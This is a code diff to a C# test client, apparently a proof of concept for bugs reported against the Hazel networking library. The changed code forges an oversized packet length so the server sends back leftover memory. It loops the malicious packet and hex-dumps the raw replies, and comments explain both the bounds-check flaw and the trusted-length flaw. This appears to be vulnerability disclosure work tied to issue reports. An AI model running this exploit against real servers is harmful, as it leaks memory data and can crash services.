@@ -25,7 +25,8 @@ namespace HazelTestClient
                 MessageWriter writer = MessageWriter.Get(SendOption.None);
                 writer.StartMessage(0x7F);
 
-                // THE BUG
+                // BUG 1
+                // (issue #5)
                 //
                 // No bound checks. When the server wants to read a string from
                 // an offset, it reads the packed int at that offset, treats it
@@ -46,7 +47,26 @@ namespace HazelTestClient
                 //
                 writer.WritePacked(0x50);
 
-                writer.EndMessage();
+                // BUG 2
+                // (issue #7)
+                // 
+                // The server blindly trusts the packet length that is specified in
+                // the packet. It does not store the real length of the packet anywhere.
+                // By specifying a high packet size and a high string size, the server
+                // can be fooled into sending left-over data to the client even after
+                // merging pull request #6 (which fixes issue #5). It is also possible
+                // to cause an exception to be thrown by using sizes that are way too
+                // high.
+                //
+                // The line below will cause MessageWriter.EndMessage() write a packet
+                // size that is higher than what it should write to the byte buffer. This
+                // may or may not be considered a bug. This is required to exploit the
+                // bug described above, which definitely is a bug.
+                //
+                writer.Position += 0x500;
+                writer.EndMessage(); // EndMessage() doesn't modify the Position property
+                writer.Position -= 0x500;
+
                 while (true)
                 {
                     connection.Send(writer);
@@ -69,9 +89,8 @@ namespace HazelTestClient
         static void HandleNewData(DataReceivedEventArgs args)
         {
             Console.WriteLine("Received new data!");
-            string output = args.Message.ReadMessage().ReadString();
-            byte[] byteArray = Encoding.ASCII.GetBytes(output);
-            for (int i = 0; i < byteArray.Length; i += 16)
+            byte[] byteArray = args.Message.Buffer;
+            for (int i = 0; i < args.Message.Length; i += 16)
             {
                 int writeCounter = 0;
                 for (int j = i; j < i + 16 && j < byteArray.Length; j++)
